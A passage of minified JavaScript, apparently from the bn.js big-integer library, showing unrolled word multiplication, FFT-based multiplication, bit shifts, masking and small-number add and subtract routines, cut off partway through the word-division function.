              (n = (n + Math.imul(u, $)) | 0),
              (i = (i + Math.imul(u, tt)) | 0),
              (i = (i + Math.imul(d, $)) | 0),
              (s = (s + Math.imul(d, tt)) | 0));
            var Bt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Bt >>> 26)) | 0),
              (Bt &= 67108863),
              (n = Math.imul(D, L)),
              (i = Math.imul(D, q)),
              (i = (i + Math.imul(M, L)) | 0),
              (s = Math.imul(M, q)),
              (n = (n + Math.imul(E, j)) | 0),
              (i = (i + Math.imul(E, V)) | 0),
              (i = (i + Math.imul(b, j)) | 0),
              (s = (s + Math.imul(b, V)) | 0),
              (n = (n + Math.imul(B, J)) | 0),
              (i = (i + Math.imul(B, G)) | 0),
              (i = (i + Math.imul(A, J)) | 0),
              (s = (s + Math.imul(A, G)) | 0),
              (n = (n + Math.imul(g, Y)) | 0),
              (i = (i + Math.imul(g, Z)) | 0),
              (i = (i + Math.imul(y, Y)) | 0),
              (s = (s + Math.imul(y, Z)) | 0),
              (n = (n + Math.imul(p, $)) | 0),
              (i = (i + Math.imul(p, tt)) | 0),
              (i = (i + Math.imul(w, $)) | 0),
              (s = (s + Math.imul(w, tt)) | 0),
              (n = (n + Math.imul(u, rt)) | 0),
              (i = (i + Math.imul(u, nt)) | 0),
              (i = (i + Math.imul(d, rt)) | 0),
              (s = (s + Math.imul(d, nt)) | 0));
            var At = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (At >>> 26)) | 0),
              (At &= 67108863),
              (n = Math.imul(T, L)),
              (i = Math.imul(T, q)),
              (i = (i + Math.imul(S, L)) | 0),
              (s = Math.imul(S, q)),
              (n = (n + Math.imul(D, j)) | 0),
              (i = (i + Math.imul(D, V)) | 0),
              (i = (i + Math.imul(M, j)) | 0),
              (s = (s + Math.imul(M, V)) | 0),
              (n = (n + Math.imul(E, J)) | 0),
              (i = (i + Math.imul(E, G)) | 0),
              (i = (i + Math.imul(b, J)) | 0),
              (s = (s + Math.imul(b, G)) | 0),
              (n = (n + Math.imul(B, Y)) | 0),
              (i = (i + Math.imul(B, Z)) | 0),
              (i = (i + Math.imul(A, Y)) | 0),
              (s = (s + Math.imul(A, Z)) | 0),
              (n = (n + Math.imul(g, $)) | 0),
              (i = (i + Math.imul(g, tt)) | 0),
              (i = (i + Math.imul(y, $)) | 0),
              (s = (s + Math.imul(y, tt)) | 0),
              (n = (n + Math.imul(p, rt)) | 0),
              (i = (i + Math.imul(p, nt)) | 0),
              (i = (i + Math.imul(w, rt)) | 0),
              (s = (s + Math.imul(w, nt)) | 0),
              (n = (n + Math.imul(u, st)) | 0),
              (i = (i + Math.imul(u, ot)) | 0),
              (i = (i + Math.imul(d, st)) | 0),
              (s = (s + Math.imul(d, ot)) | 0));
            var Ft = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Ft >>> 26)) | 0),
              (Ft &= 67108863),
              (n = Math.imul(x, L)),
              (i = Math.imul(x, q)),
              (i = (i + Math.imul(I, L)) | 0),
              (s = Math.imul(I, q)),
              (n = (n + Math.imul(T, j)) | 0),
              (i = (i + Math.imul(T, V)) | 0),
              (i = (i + Math.imul(S, j)) | 0),
              (s = (s + Math.imul(S, V)) | 0),
              (n = (n + Math.imul(D, J)) | 0),
              (i = (i + Math.imul(D, G)) | 0),
              (i = (i + Math.imul(M, J)) | 0),
              (s = (s + Math.imul(M, G)) | 0),
              (n = (n + Math.imul(E, Y)) | 0),
              (i = (i + Math.imul(E, Z)) | 0),
              (i = (i + Math.imul(b, Y)) | 0),
              (s = (s + Math.imul(b, Z)) | 0),
              (n = (n + Math.imul(B, $)) | 0),
              (i = (i + Math.imul(B, tt)) | 0),
              (i = (i + Math.imul(A, $)) | 0),
              (s = (s + Math.imul(A, tt)) | 0),
              (n = (n + Math.imul(g, rt)) | 0),
              (i = (i + Math.imul(g, nt)) | 0),
              (i = (i + Math.imul(y, rt)) | 0),
              (s = (s + Math.imul(y, nt)) | 0),
              (n = (n + Math.imul(p, st)) | 0),
              (i = (i + Math.imul(p, ot)) | 0),
              (i = (i + Math.imul(w, st)) | 0),
              (s = (s + Math.imul(w, ot)) | 0),
              (n = (n + Math.imul(u, lt)) | 0),
              (i = (i + Math.imul(u, ht)) | 0),
              (i = (i + Math.imul(d, lt)) | 0),
              (s = (s + Math.imul(d, ht)) | 0));
            var Et = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Et >>> 26)) | 0),
              (Et &= 67108863),
              (n = Math.imul(R, L)),
              (i = Math.imul(R, q)),
              (i = (i + Math.imul(N, L)) | 0),
              (s = Math.imul(N, q)),
              (n = (n + Math.imul(x, j)) | 0),
              (i = (i + Math.imul(x, V)) | 0),
              (i = (i + Math.imul(I, j)) | 0),
              (s = (s + Math.imul(I, V)) | 0),
              (n = (n + Math.imul(T, J)) | 0),
              (i = (i + Math.imul(T, G)) | 0),
              (i = (i + Math.imul(S, J)) | 0),
              (s = (s + Math.imul(S, G)) | 0),
              (n = (n + Math.imul(D, Y)) | 0),
              (i = (i + Math.imul(D, Z)) | 0),
              (i = (i + Math.imul(M, Y)) | 0),
              (s = (s + Math.imul(M, Z)) | 0),
              (n = (n + Math.imul(E, $)) | 0),
              (i = (i + Math.imul(E, tt)) | 0),
              (i = (i + Math.imul(b, $)) | 0),
              (s = (s + Math.imul(b, tt)) | 0),
              (n = (n + Math.imul(B, rt)) | 0),
              (i = (i + Math.imul(B, nt)) | 0),
              (i = (i + Math.imul(A, rt)) | 0),
              (s = (s + Math.imul(A, nt)) | 0),
              (n = (n + Math.imul(g, st)) | 0),
              (i = (i + Math.imul(g, ot)) | 0),
              (i = (i + Math.imul(y, st)) | 0),
              (s = (s + Math.imul(y, ot)) | 0),
              (n = (n + Math.imul(p, lt)) | 0),
              (i = (i + Math.imul(p, ht)) | 0),
              (i = (i + Math.imul(w, lt)) | 0),
              (s = (s + Math.imul(w, ht)) | 0),
              (n = (n + Math.imul(u, ut)) | 0),
              (i = (i + Math.imul(u, dt)) | 0),
              (i = (i + Math.imul(d, ut)) | 0),
              (s = (s + Math.imul(d, dt)) | 0));
            var bt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (bt >>> 26)) | 0),
              (bt &= 67108863),
              (n = Math.imul(O, L)),
              (i = Math.imul(O, q)),
              (i = (i + Math.imul(K, L)) | 0),
              (s = Math.imul(K, q)),
              (n = (n + Math.imul(R, j)) | 0),
              (i = (i + Math.imul(R, V)) | 0),
              (i = (i + Math.imul(N, j)) | 0),
              (s = (s + Math.imul(N, V)) | 0),
              (n = (n + Math.imul(x, J)) | 0),
              (i = (i + Math.imul(x, G)) | 0),
              (i = (i + Math.imul(I, J)) | 0),
              (s = (s + Math.imul(I, G)) | 0),
              (n = (n + Math.imul(T, Y)) | 0),
              (i = (i + Math.imul(T, Z)) | 0),
              (i = (i + Math.imul(S, Y)) | 0),
              (s = (s + Math.imul(S, Z)) | 0),
              (n = (n + Math.imul(D, $)) | 0),
              (i = (i + Math.imul(D, tt)) | 0),
              (i = (i + Math.imul(M, $)) | 0),
              (s = (s + Math.imul(M, tt)) | 0),
              (n = (n + Math.imul(E, rt)) | 0),
              (i = (i + Math.imul(E, nt)) | 0),
              (i = (i + Math.imul(b, rt)) | 0),
              (s = (s + Math.imul(b, nt)) | 0),
              (n = (n + Math.imul(B, st)) | 0),
              (i = (i + Math.imul(B, ot)) | 0),
              (i = (i + Math.imul(A, st)) | 0),
              (s = (s + Math.imul(A, ot)) | 0),
              (n = (n + Math.imul(g, lt)) | 0),
              (i = (i + Math.imul(g, ht)) | 0),
              (i = (i + Math.imul(y, lt)) | 0),
              (s = (s + Math.imul(y, ht)) | 0),
              (n = (n + Math.imul(p, ut)) | 0),
              (i = (i + Math.imul(p, dt)) | 0),
              (i = (i + Math.imul(w, ut)) | 0),
              (s = (s + Math.imul(w, dt)) | 0),
              (n = (n + Math.imul(u, pt)) | 0),
              (i = (i + Math.imul(u, wt)) | 0),
              (i = (i + Math.imul(d, pt)) | 0),
              (s = (s + Math.imul(d, wt)) | 0));
            var vt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (vt >>> 26)) | 0),
              (vt &= 67108863),
              (n = Math.imul(O, j)),
              (i = Math.imul(O, V)),
              (i = (i + Math.imul(K, j)) | 0),
              (s = Math.imul(K, V)),
              (n = (n + Math.imul(R, J)) | 0),
              (i = (i + Math.imul(R, G)) | 0),
              (i = (i + Math.imul(N, J)) | 0),
              (s = (s + Math.imul(N, G)) | 0),
              (n = (n + Math.imul(x, Y)) | 0),
              (i = (i + Math.imul(x, Z)) | 0),
              (i = (i + Math.imul(I, Y)) | 0),
              (s = (s + Math.imul(I, Z)) | 0),
              (n = (n + Math.imul(T, $)) | 0),
              (i = (i + Math.imul(T, tt)) | 0),
              (i = (i + Math.imul(S, $)) | 0),
              (s = (s + Math.imul(S, tt)) | 0),
              (n = (n + Math.imul(D, rt)) | 0),
              (i = (i + Math.imul(D, nt)) | 0),
              (i = (i + Math.imul(M, rt)) | 0),
              (s = (s + Math.imul(M, nt)) | 0),
              (n = (n + Math.imul(E, st)) | 0),
              (i = (i + Math.imul(E, ot)) | 0),
              (i = (i + Math.imul(b, st)) | 0),
              (s = (s + Math.imul(b, ot)) | 0),
              (n = (n + Math.imul(B, lt)) | 0),
              (i = (i + Math.imul(B, ht)) | 0),
              (i = (i + Math.imul(A, lt)) | 0),
              (s = (s + Math.imul(A, ht)) | 0),
              (n = (n + Math.imul(g, ut)) | 0),
              (i = (i + Math.imul(g, dt)) | 0),
              (i = (i + Math.imul(y, ut)) | 0),
              (s = (s + Math.imul(y, dt)) | 0),
              (n = (n + Math.imul(p, pt)) | 0),
              (i = (i + Math.imul(p, wt)) | 0),
              (i = (i + Math.imul(w, pt)) | 0),
              (s = (s + Math.imul(w, wt)) | 0));
            var Dt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Dt >>> 26)) | 0),
              (Dt &= 67108863),
              (n = Math.imul(O, J)),
              (i = Math.imul(O, G)),
              (i = (i + Math.imul(K, J)) | 0),
              (s = Math.imul(K, G)),
              (n = (n + Math.imul(R, Y)) | 0),
              (i = (i + Math.imul(R, Z)) | 0),
              (i = (i + Math.imul(N, Y)) | 0),
              (s = (s + Math.imul(N, Z)) | 0),
              (n = (n + Math.imul(x, $)) | 0),
              (i = (i + Math.imul(x, tt)) | 0),
              (i = (i + Math.imul(I, $)) | 0),
              (s = (s + Math.imul(I, tt)) | 0),
              (n = (n + Math.imul(T, rt)) | 0),
              (i = (i + Math.imul(T, nt)) | 0),
              (i = (i + Math.imul(S, rt)) | 0),
              (s = (s + Math.imul(S, nt)) | 0),
              (n = (n + Math.imul(D, st)) | 0),
              (i = (i + Math.imul(D, ot)) | 0),
              (i = (i + Math.imul(M, st)) | 0),
              (s = (s + Math.imul(M, ot)) | 0),
              (n = (n + Math.imul(E, lt)) | 0),
              (i = (i + Math.imul(E, ht)) | 0),
              (i = (i + Math.imul(b, lt)) | 0),
              (s = (s + Math.imul(b, ht)) | 0),
              (n = (n + Math.imul(B, ut)) | 0),
              (i = (i + Math.imul(B, dt)) | 0),
              (i = (i + Math.imul(A, ut)) | 0),
              (s = (s + Math.imul(A, dt)) | 0),
              (n = (n + Math.imul(g, pt)) | 0),
              (i = (i + Math.imul(g, wt)) | 0),
              (i = (i + Math.imul(y, pt)) | 0),
              (s = (s + Math.imul(y, wt)) | 0));
            var Mt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Mt >>> 26)) | 0),
              (Mt &= 67108863),
              (n = Math.imul(O, Y)),
              (i = Math.imul(O, Z)),
              (i = (i + Math.imul(K, Y)) | 0),
              (s = Math.imul(K, Z)),
              (n = (n + Math.imul(R, $)) | 0),
              (i = (i + Math.imul(R, tt)) | 0),
              (i = (i + Math.imul(N, $)) | 0),
              (s = (s + Math.imul(N, tt)) | 0),
              (n = (n + Math.imul(x, rt)) | 0),
              (i = (i + Math.imul(x, nt)) | 0),
              (i = (i + Math.imul(I, rt)) | 0),
              (s = (s + Math.imul(I, nt)) | 0),
              (n = (n + Math.imul(T, st)) | 0),
              (i = (i + Math.imul(T, ot)) | 0),
              (i = (i + Math.imul(S, st)) | 0),
              (s = (s + Math.imul(S, ot)) | 0),
              (n = (n + Math.imul(D, lt)) | 0),
              (i = (i + Math.imul(D, ht)) | 0),
              (i = (i + Math.imul(M, lt)) | 0),
              (s = (s + Math.imul(M, ht)) | 0),
              (n = (n + Math.imul(E, ut)) | 0),
              (i = (i + Math.imul(E, dt)) | 0),
              (i = (i + Math.imul(b, ut)) | 0),
              (s = (s + Math.imul(b, dt)) | 0),
              (n = (n + Math.imul(B, pt)) | 0),
              (i = (i + Math.imul(B, wt)) | 0),
              (i = (i + Math.imul(A, pt)) | 0),
              (s = (s + Math.imul(A, wt)) | 0));
            var _t = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (_t >>> 26)) | 0),
              (_t &= 67108863),
              (n = Math.imul(O, $)),
              (i = Math.imul(O, tt)),
              (i = (i + Math.imul(K, $)) | 0),
              (s = Math.imul(K, tt)),
              (n = (n + Math.imul(R, rt)) | 0),
              (i = (i + Math.imul(R, nt)) | 0),
              (i = (i + Math.imul(N, rt)) | 0),
              (s = (s + Math.imul(N, nt)) | 0),
              (n = (n + Math.imul(x, st)) | 0),
              (i = (i + Math.imul(x, ot)) | 0),
              (i = (i + Math.imul(I, st)) | 0),
              (s = (s + Math.imul(I, ot)) | 0),
              (n = (n + Math.imul(T, lt)) | 0),
              (i = (i + Math.imul(T, ht)) | 0),
              (i = (i + Math.imul(S, lt)) | 0),
              (s = (s + Math.imul(S, ht)) | 0),
              (n = (n + Math.imul(D, ut)) | 0),
              (i = (i + Math.imul(D, dt)) | 0),
              (i = (i + Math.imul(M, ut)) | 0),
              (s = (s + Math.imul(M, dt)) | 0),
              (n = (n + Math.imul(E, pt)) | 0),
              (i = (i + Math.imul(E, wt)) | 0),
              (i = (i + Math.imul(b, pt)) | 0),
              (s = (s + Math.imul(b, wt)) | 0));
            var Tt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Tt >>> 26)) | 0),
              (Tt &= 67108863),
              (n = Math.imul(O, rt)),
              (i = Math.imul(O, nt)),
              (i = (i + Math.imul(K, rt)) | 0),
              (s = Math.imul(K, nt)),
              (n = (n + Math.imul(R, st)) | 0),
              (i = (i + Math.imul(R, ot)) | 0),
              (i = (i + Math.imul(N, st)) | 0),
              (s = (s + Math.imul(N, ot)) | 0),
              (n = (n + Math.imul(x, lt)) | 0),
              (i = (i + Math.imul(x, ht)) | 0),
              (i = (i + Math.imul(I, lt)) | 0),
              (s = (s + Math.imul(I, ht)) | 0),
              (n = (n + Math.imul(T, ut)) | 0),
              (i = (i + Math.imul(T, dt)) | 0),
              (i = (i + Math.imul(S, ut)) | 0),
              (s = (s + Math.imul(S, dt)) | 0),
              (n = (n + Math.imul(D, pt)) | 0),
              (i = (i + Math.imul(D, wt)) | 0),
              (i = (i + Math.imul(M, pt)) | 0),
              (s = (s + Math.imul(M, wt)) | 0));
            var St = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (St >>> 26)) | 0),
              (St &= 67108863),
              (n = Math.imul(O, st)),
              (i = Math.imul(O, ot)),
              (i = (i + Math.imul(K, st)) | 0),
              (s = Math.imul(K, ot)),
              (n = (n + Math.imul(R, lt)) | 0),
              (i = (i + Math.imul(R, ht)) | 0),
              (i = (i + Math.imul(N, lt)) | 0),
              (s = (s + Math.imul(N, ht)) | 0),
              (n = (n + Math.imul(x, ut)) | 0),
              (i = (i + Math.imul(x, dt)) | 0),
              (i = (i + Math.imul(I, ut)) | 0),
              (s = (s + Math.imul(I, dt)) | 0),
              (n = (n + Math.imul(T, pt)) | 0),
              (i = (i + Math.imul(T, wt)) | 0),
              (i = (i + Math.imul(S, pt)) | 0),
              (s = (s + Math.imul(S, wt)) | 0));
            var kt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (kt >>> 26)) | 0),
              (kt &= 67108863),
              (n = Math.imul(O, lt)),
              (i = Math.imul(O, ht)),
              (i = (i + Math.imul(K, lt)) | 0),
              (s = Math.imul(K, ht)),
              (n = (n + Math.imul(R, ut)) | 0),
              (i = (i + Math.imul(R, dt)) | 0),
              (i = (i + Math.imul(N, ut)) | 0),
              (s = (s + Math.imul(N, dt)) | 0),
              (n = (n + Math.imul(x, pt)) | 0),
              (i = (i + Math.imul(x, wt)) | 0),
              (i = (i + Math.imul(I, pt)) | 0),
              (s = (s + Math.imul(I, wt)) | 0));
            var xt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (xt >>> 26)) | 0),
              (xt &= 67108863),
              (n = Math.imul(O, ut)),
              (i = Math.imul(O, dt)),
              (i = (i + Math.imul(K, ut)) | 0),
              (s = Math.imul(K, dt)),
              (n = (n + Math.imul(R, pt)) | 0),
              (i = (i + Math.imul(R, wt)) | 0),
              (i = (i + Math.imul(N, pt)) | 0),
              (s = (s + Math.imul(N, wt)) | 0));
            var It = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (It >>> 26)) | 0),
              (It &= 67108863),
              (n = Math.imul(O, pt)),
              (i = Math.imul(O, wt)),
              (i = (i + Math.imul(K, pt)) | 0),
              (s = Math.imul(K, wt)));
            var Ut = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            return (
              (h = (((s + (i >>> 13)) | 0) + (Ut >>> 26)) | 0),
              (Ut &= 67108863),
              (l[0] = Ct),
              (l[1] = gt),
              (l[2] = yt),
              (l[3] = mt),
              (l[4] = Bt),
              (l[5] = At),
              (l[6] = Ft),
              (l[7] = Et),
              (l[8] = bt),
              (l[9] = vt),
              (l[10] = Dt),
              (l[11] = Mt),
              (l[12] = _t),
              (l[13] = Tt),
              (l[14] = St),
              (l[15] = kt),
              (l[16] = xt),
              (l[17] = It),
              (l[18] = Ut),
              0 !== h && ((l[19] = h), r.length++),
              r
            );
          };
          function y(t, e, r) {
            ((r.negative = e.negative ^ t.negative),
              (r.length = t.length + e.length));
            for (var n = 0, i = 0, s = 0; s < r.length - 1; s++) {
              var o = i;
              i = 0;
              for (
                var a = 67108863 & n,
                  l = Math.min(s, e.length - 1),
                  h = Math.max(0, s - t.length + 1);
                h <= l;
                h++
              ) {
                var c = s - h,
                  u = 0 | t.words[c],
                  d = 0 | e.words[h],
                  f = u * d,
                  p = 67108863 & f;
                ((o = (o + ((f / 67108864) | 0)) | 0),
                  (p = (p + a) | 0),
                  (a = 67108863 & p),
                  (o = (o + (p >>> 26)) | 0),
                  (i += o >>> 26),
                  (o &= 67108863));
              }
              ((r.words[s] = a), (n = o), (o = i));
            }
            return (0 !== n ? (r.words[s] = n) : r.length--, r._strip());
          }
          function m(t, e, r) {
            return y(t, e, r);
          }
          function B(t, e) {
            ((this.x = t), (this.y = e));
          }
          (Math.imul || (g = C),
            (s.prototype.mulTo = function (t, e) {
              var r,
                n = this.length + t.length;
              return (
                (r =
                  10 === this.length && 10 === t.length
                    ? g(this, t, e)
                    : n < 63
                      ? C(this, t, e)
                      : n < 1024
                        ? y(this, t, e)
                        : m(this, t, e)),
                r
              );
            }),
            (B.prototype.makeRBT = function (t) {
              for (
                var e = new Array(t), r = s.prototype._countBits(t) - 1, n = 0;
                n < t;
                n++
              )
                e[n] = this.revBin(n, r, t);
              return e;
            }),
            (B.prototype.revBin = function (t, e, r) {
              if (0 === t || t === r - 1) return t;
              for (var n = 0, i = 0; i < e; i++)
                ((n |= (1 & t) << (e - i - 1)), (t >>= 1));
              return n;
            }),
            (B.prototype.permute = function (t, e, r, n, i, s) {
              for (var o = 0; o < s; o++) ((n[o] = e[t[o]]), (i[o] = r[t[o]]));
            }),
            (B.prototype.transform = function (t, e, r, n, i, s) {
              this.permute(s, t, e, r, n, i);
              for (var o = 1; o < i; o <<= 1)
                for (
                  var a = o << 1,
                    l = Math.cos((2 * Math.PI) / a),
                    h = Math.sin((2 * Math.PI) / a),
                    c = 0;
                  c < i;
                  c += a
                )
                  for (var u = l, d = h, f = 0; f < o; f++) {
                    var p = r[c + f],
                      w = n[c + f],
                      C = r[c + f + o],
                      g = n[c + f + o],
                      y = u * C - d * g;
                    ((g = u * g + d * C),
                      (C = y),
                      (r[c + f] = p + C),
                      (n[c + f] = w + g),
                      (r[c + f + o] = p - C),
                      (n[c + f + o] = w - g),
                      f !== a &&
                        ((y = l * u - h * d), (d = l * d + h * u), (u = y)));
                  }
            }),
            (B.prototype.guessLen13b = function (t, e) {
              var r = 1 | Math.max(e, t),
                n = 1 & r,
                i = 0;
              for (r = (r / 2) | 0; r; r >>>= 1) i++;
              return 1 << (i + 1 + n);
            }),
            (B.prototype.conjugate = function (t, e, r) {
              if (!(r <= 1))
                for (var n = 0; n < r / 2; n++) {
                  var i = t[n];
                  ((t[n] = t[r - n - 1]),
                    (t[r - n - 1] = i),
                    (i = e[n]),
                    (e[n] = -e[r - n - 1]),
                    (e[r - n - 1] = -i));
                }
            }),
            (B.prototype.normalize13b = function (t, e) {
              for (var r = 0, n = 0; n < e / 2; n++) {
                var i =
                  8192 * Math.round(t[2 * n + 1] / e) +
                  Math.round(t[2 * n] / e) +
                  r;
                ((t[n] = 67108863 & i),
                  (r = i < 67108864 ? 0 : (i / 67108864) | 0));
              }
              return t;
            }),
            (B.prototype.convert13b = function (t, e, r, i) {
              for (var s = 0, o = 0; o < e; o++)
                ((s += 0 | t[o]),
                  (r[2 * o] = 8191 & s),
                  (s >>>= 13),
                  (r[2 * o + 1] = 8191 & s),
                  (s >>>= 13));
              for (o = 2 * e; o < i; ++o) r[o] = 0;
              (n(0 === s), n(0 === (-8192 & s)));
            }),
            (B.prototype.stub = function (t) {
              for (var e = new Array(t), r = 0; r < t; r++) e[r] = 0;
              return e;
            }),
            (B.prototype.mulp = function (t, e, r) {
              var n = 2 * this.guessLen13b(t.length, e.length),
                i = this.makeRBT(n),
                s = this.stub(n),
                o = new Array(n),
                a = new Array(n),
                l = new Array(n),
                h = new Array(n),
                c = new Array(n),
                u = new Array(n),
                d = r.words;
              ((d.length = n),
                this.convert13b(t.words, t.length, o, n),
                this.convert13b(e.words, e.length, h, n),
                this.transform(o, s, a, l, n, i),
                this.transform(h, s, c, u, n, i));
              for (var f = 0; f < n; f++) {
                var p = a[f] * c[f] - l[f] * u[f];
                ((l[f] = a[f] * u[f] + l[f] * c[f]), (a[f] = p));
              }
              return (
                this.conjugate(a, l, n),
                this.transform(a, l, d, s, n, i),
                this.conjugate(d, s, n),
                this.normalize13b(d, n),
                (r.negative = t.negative ^ e.negative),
                (r.length = t.length + e.length),
                r._strip()
              );
            }),
            (s.prototype.mul = function (t) {
              var e = new s(null);
              return (
                (e.words = new Array(this.length + t.length)),
                this.mulTo(t, e)
              );
            }),
            (s.prototype.mulf = function (t) {
              var e = new s(null);
              return (
                (e.words = new Array(this.length + t.length)),
                m(this, t, e)
              );
            }),
            (s.prototype.imul = function (t) {
              return this.clone().mulTo(t, this);
            }),
            (s.prototype.imuln = function (t) {
              var e = t < 0;
              (e && (t = -t), n("number" === typeof t), n(t < 67108864));
              for (var r = 0, i = 0; i < this.length; i++) {
                var s = (0 | this.words[i]) * t,
                  o = (67108863 & s) + (67108863 & r);
                ((r >>= 26),
                  (r += (s / 67108864) | 0),
                  (r += o >>> 26),
                  (this.words[i] = 67108863 & o));
              }
              return (
                0 !== r && ((this.words[i] = r), this.length++),
                e ? this.ineg() : this
              );
            }),
            (s.prototype.muln = function (t) {
              return this.clone().imuln(t);
            }),
            (s.prototype.sqr = function () {
              return this.mul(this);
            }),
            (s.prototype.isqr = function () {
              return this.imul(this.clone());
            }),
            (s.prototype.pow = function (t) {
              var e = w(t);
              if (0 === e.length) return new s(1);
              for (var r = this, n = 0; n < e.length; n++, r = r.sqr())
                if (0 !== e[n]) break;
              if (++n < e.length)
                for (var i = r.sqr(); n < e.length; n++, i = i.sqr())
                  0 !== e[n] && (r = r.mul(i));
              return r;
            }),
            (s.prototype.iushln = function (t) {
              n("number" === typeof t && t >= 0);
              var e,
                r = t % 26,
                i = (t - r) / 26,
                s = (67108863 >>> (26 - r)) << (26 - r);
              if (0 !== r) {
                var o = 0;
                for (e = 0; e < this.length; e++) {
                  var a = this.words[e] & s,
                    l = ((0 | this.words[e]) - a) << r;
                  ((this.words[e] = l | o), (o = a >>> (26 - r)));
                }
                o && ((this.words[e] = o), this.length++);
              }
              if (0 !== i) {
                for (e = this.length - 1; e >= 0; e--)
                  this.words[e + i] = this.words[e];
                for (e = 0; e < i; e++) this.words[e] = 0;
                this.length += i;
              }
              return this._strip();
            }),
            (s.prototype.ishln = function (t) {
              return (n(0 === this.negative), this.iushln(t));
            }),
            (s.prototype.iushrn = function (t, e, r) {
              var i;
              (n("number" === typeof t && t >= 0),
                (i = e ? (e - (e % 26)) / 26 : 0));
              var s = t % 26,
                o = Math.min((t - s) / 26, this.length),
                a = 67108863 ^ ((67108863 >>> s) << s),
                l = r;
              if (((i -= o), (i = Math.max(0, i)), l)) {
                for (var h = 0; h < o; h++) l.words[h] = this.words[h];
                l.length = o;
              }
              if (0 === o);
              else if (this.length > o)
                for (this.length -= o, h = 0; h < this.length; h++)
                  this.words[h] = this.words[h + o];
              else ((this.words[0] = 0), (this.length = 1));
              var c = 0;
              for (h = this.length - 1; h >= 0 && (0 !== c || h >= i); h--) {
                var u = 0 | this.words[h];
                ((this.words[h] = (c << (26 - s)) | (u >>> s)), (c = u & a));
              }
              return (
                l && 0 !== c && (l.words[l.length++] = c),
                0 === this.length && ((this.words[0] = 0), (this.length = 1)),
                this._strip()
              );
            }),
            (s.prototype.ishrn = function (t, e, r) {
              return (n(0 === this.negative), this.iushrn(t, e, r));
            }),
            (s.prototype.shln = function (t) {
              return this.clone().ishln(t);
            }),
            (s.prototype.ushln = function (t) {
              return this.clone().iushln(t);
            }),
            (s.prototype.shrn = function (t) {
              return this.clone().ishrn(t);
            }),
            (s.prototype.ushrn = function (t) {
              return this.clone().iushrn(t);
            }),
            (s.prototype.testn = function (t) {
              n("number" === typeof t && t >= 0);
              var e = t % 26,
                r = (t - e) / 26,
                i = 1 << e;
              if (this.length <= r) return !1;
              var s = this.words[r];
              return !!(s & i);
            }),
            (s.prototype.imaskn = function (t) {
              n("number" === typeof t && t >= 0);
              var e = t % 26,
                r = (t - e) / 26;
              if (
                (n(
                  0 === this.negative,
                  "imaskn works only with positive numbers",
                ),
                this.length <= r)
              )
                return this;
              if (
                (0 !== e && r++,
                (this.length = Math.min(r, this.length)),
                0 !== e)
              ) {
                var i = 67108863 ^ ((67108863 >>> e) << e);
                this.words[this.length - 1] &= i;
              }
              return this._strip();
            }),
            (s.prototype.maskn = function (t) {
              return this.clone().imaskn(t);
            }),
            (s.prototype.iaddn = function (t) {
              return (
                n("number" === typeof t),
                n(t < 67108864),
                t < 0
                  ? this.isubn(-t)
                  : 0 !== this.negative
                    ? 1 === this.length && (0 | this.words[0]) <= t
                      ? ((this.words[0] = t - (0 | this.words[0])),
                        (this.negative = 0),
                        this)
                      : ((this.negative = 0),
                        this.isubn(t),
                        (this.negative = 1),
                        this)
                    : this._iaddn(t)
              );
            }),
            (s.prototype._iaddn = function (t) {
              this.words[0] += t;
              for (var e = 0; e < this.length && this.words[e] >= 67108864; e++)
                ((this.words[e] -= 67108864),
                  e === this.length - 1
                    ? (this.words[e + 1] = 1)
                    : this.words[e + 1]++);
              return ((this.length = Math.max(this.length, e + 1)), this);
            }),
            (s.prototype.isubn = function (t) {
              if ((n("number" === typeof t), n(t < 67108864), t < 0))
                return this.iaddn(-t);
              if (0 !== this.negative)
                return (
                  (this.negative = 0),
                  this.iaddn(t),
                  (this.negative = 1),
                  this
                );
              if (
                ((this.words[0] -= t), 1 === this.length && this.words[0] < 0)
              )
                ((this.words[0] = -this.words[0]), (this.negative = 1));
              else
                for (var e = 0; e < this.length && this.words[e] < 0; e++)
                  ((this.words[e] += 67108864), (this.words[e + 1] -= 1));
              return this._strip();
            }),
            (s.prototype.addn = function (t) {
              return this.clone().iaddn(t);
            }),
            (s.prototype.subn = function (t) {
              return this.clone().isubn(t);
            }),
            (s.prototype.iabs = function () {
              return ((this.negative = 0), this);
            }),
            (s.prototype.abs = function () {
              return this.clone().iabs();
            }),
            (s.prototype._ishlnsubmul = function (t, e, r) {
              var i,
                s,
                o = t.length + r;
              this._expand(o);
              var a = 0;
              for (i = 0; i < t.length; i++) {
                s = (0 | this.words[i + r]) + a;
                var l = (0 | t.words[i]) * e;
                ((s -= 67108863 & l),
                  (a = (s >> 26) - ((l / 67108864) | 0)),
                  (this.words[i + r] = 67108863 & s));
              }
              for (; i < this.length - r; i++)
                ((s = (0 | this.words[i + r]) + a),
                  (a = s >> 26),
                  (this.words[i + r] = 67108863 & s));
              if (0 === a) return this._strip();
              for (n(-1 === a), a = 0, i = 0; i < this.length; i++)
                ((s = -(0 | this.words[i]) + a),
                  (a = s >> 26),
                  (this.words[i] = 67108863 & s));
              return ((this.negative = 1), this._strip());
            }),
            (s.prototype._wordDiv = function (t, e) {
              var r = this.length - t.length,
                n = this.clone(),
                i = t,
